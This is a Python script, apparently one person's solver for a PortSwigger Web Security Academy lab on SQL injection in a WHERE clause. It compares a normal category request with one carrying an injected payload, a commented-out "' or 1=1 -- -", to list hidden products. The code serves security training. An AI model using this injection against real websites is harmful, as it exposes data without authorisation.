import requests
import lxml.html
import typer

from rich.console import Console
from rich.table import Table

from collections import namedtuple

from time import sleep

from termcolor import colored

LAB_DOMAIN = 'web-security-academy.net'
DEFAULT_SID = '00000000000000000000000000000000'
ENDPOINT = '/filter?category=Accessories'
#PAYLOAD = "' or 1=1 -- -"

console = Console()
table = Table(title = "Hidden Products")
table.add_column("Product Name")
table.add_column("Product Rating")

Product = namedtuple("Product", "name rating")

def print_banner():
    print(colored("\n\n Jan Duinkerken's PortSwigger Academy solver \n", 'yellow', attrs=['bold']))
    print(colored("""\
            ////////////////    ///////////////
            ////////////////    ///////////////
            ///////////////     ///////////////
            /////////////     /////////////////
            ///////////     ///////////////////
            /////////           ///////////////
            ///////             ///////////////
            ////////////////    ///////////////
            ////////////////            *//////
            ////////////////          *////////
            ///////////////////*    ///////////
            /////////////////,    /////////////
            ////////////////    ///////////////
            ////////////////    /////////////// 
          """, 'yellow', attrs=['bold']))
    print("\n")

def fetch_products(payload, sid, endpoint):
    res = []
    response = requests.get(f"https://{sid}.{LAB_DOMAIN}{endpoint}" + payload if payload else f"https://{sid}.{LAB_DOMAIN}")
    
    if response.status_code == 200:
        html_node = lxml.html.fromstring(response.text)
        products = html_node.xpath("//section[@class='container-list-tiles']/div")
        for product in products:
            name = product.xpath("h3")[0].text
            rating = product.xpath("img[2]/@src")[0]
            res.append(Product(name, rating))
        return res
    return []

def sql_1(sid: str = DEFAULT_SID, payload: str = "", endpoint: str = '/filter?category=Accessories'):
    print_banner()
    
    print(colored("SQL injection vulnerability in WHERE clause allowing retrieval of hidden data\n", 'blue', attrs=['bold']))

    with console.status("Fetching all products(ordinary path)..."):
        all_products = fetch_products("", sid, endpoint)
    
        sleep(2) # Sleeps just to show the console status
        
        console.log(f"Fetched {str(len(all_products))}")
    
    with console.status("Fetching really all products (unexpected products)..."):
        really_all_products = fetch_products(payload, sid, endpoint)
        
        sleep(2) # Sleeps just to show the console status
        
        console.log(f"Fetched {str(len(really_all_products))}")
    
    with console.status("Computing diffetence..."):
        hidden_products = [Product for Product in really_all_products if Product not in all_products]
        for product in hidden_products:
            table.add_row(product.name, product.rating)
        
        sleep(2) # Sleeps just to show the console status
        
        console.print(table)
